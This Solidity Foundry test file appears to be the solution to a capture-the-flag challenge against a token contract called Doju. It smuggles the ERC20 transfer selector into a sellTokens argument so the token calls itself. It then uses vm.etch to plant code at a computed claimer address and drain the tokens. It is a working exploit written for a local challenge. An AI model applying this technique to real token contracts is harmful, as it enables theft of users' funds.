// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "forge-std/console.sol";
import "forge-ctf/CTFDeployer.sol";

import "src/Challenge.sol";


contract Taker {
    function withdraw(Doju doju) public {
        doju.transfer(address(0xc0ffee), doju.balanceOf(address(this)));
    }
}


contract DojuTest is Test {

    uint256 MASK = 0xffffffff;

    function getContractCode(address _addr) public view returns (bytes memory) {
        bytes memory code;
        assembly {
            // retrieve the size of the code, this needs assembly
            let size := extcodesize(_addr)
            // allocate output byte array - this could also be done without assembly
            // by using code = new bytes(size)
            code := mload(0x40)
            // new "memory end" including padding
            mstore(0x40, add(code, and(add(add(size, 0x20), 0x1f), not(0x1f))))
            // store length in memory
            mstore(code, size)
            // actually retrieve the code, this needs assembly
            extcodecopy(_addr, add(code, 0x20), 0, size)
        }
        return code;
    }


    function test_doju() public {
        Challenge challenge = new Challenge();
        Doju doju = challenge.doju();

        challenge.claimTokens();

        bytes4 prefix = bytes4(uint32(uint256(uint160(address(doju))) >> 128 & MASK));
        address CLAIMER_ADDRESS = address(uint160(bytes20(abi.encodePacked(uint128(0),prefix))));

        Taker taker = new Taker();

        uint256 minOut = uint256(bytes32(abi.encodePacked(bytes4(0xa9059cbb), bytes28(uint224(0)))));

        vm.etch(CLAIMER_ADDRESS, getContractCode(address(taker)));
        address to = address(doju);
        uint256 tokenAmount = 1e18;


        doju.sellTokens(0, address(doju), minOut);

        doju.sellTokens(0, address(doju), minOut);

        Taker(CLAIMER_ADDRESS).withdraw(doju);

        assert(challenge.isSolved());
    }

}
